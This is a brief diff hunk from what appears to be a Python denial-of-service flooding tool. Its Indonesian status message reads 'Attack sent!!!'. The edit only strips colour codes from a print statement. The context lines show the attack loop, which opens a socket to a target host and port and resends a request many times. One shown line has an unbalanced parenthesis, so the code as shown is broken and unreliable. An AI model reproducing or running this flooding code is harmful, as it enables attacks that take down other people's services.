@@ -750,7 +750,7 @@ class RequestDefaultHTTP(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(url2), int(urlport))) 
 				s.send (str.encode(request)
-				print ("\033[93m Serangan Dikirimkan!!! \033[0m", self.counter) 
+				print ("Serangan Dikirimkan!!!", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(request)) 
